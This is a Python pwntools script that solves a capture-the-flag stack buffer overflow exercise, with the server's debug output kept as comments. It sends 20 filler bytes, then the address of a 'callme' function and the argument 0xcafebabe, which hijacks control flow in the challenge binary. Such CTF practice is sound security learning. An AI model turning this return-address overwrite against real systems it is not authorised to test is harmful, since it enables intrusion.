import pwn

elf = pwn.ELF("./bof102quiz1")
p = elf.process()
pwn.context.log_level="DEBUG"
pr = pwn.remote("bof102.sstf.site", 1335)

callme_addr = elf.symbols['callme']


pr.recvuntil(b"Payload > ")

payload = b"a"*20 # 16 bytes of char payload[16] + 4 bytes EBP
payload += pwn.p32(callme_addr) # address of callme function which is 0x0804853b
payload += pwn.p32(0) # Return address for function callme
payload += pwn.p32(0xcafebabe) # arg1 to function call me

pr.sendline(payload)
pr.interactive()


#[+] Opening connection to bof102.sstf.site on port 1335: Done
#[DEBUG] Received 0x25 bytes:
#    b"Call 'callme' with arg as 0xcafebabe."
#[DEBUG] Received 0xb bytes:
#    b'\n'
#    b'Payload > '
#[DEBUG] Sent 0x21 bytes:
#    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
#    00000010  61 61 61 61  3b 85 04 08  00 00 00 00  be ba fe ca  │aaaa│;···│····│····│
#    00000020  0a                                                  │·│
#    00000021
#[*] Switching to interactive mode
#[DEBUG] Received 0x4 bytes:
#    b'bye.'
#bye.[DEBUG] Received 0x13 bytes:
#    b'\n'
#    b'Congratulations!\n'
#    b'\n'
#
#Congratulations!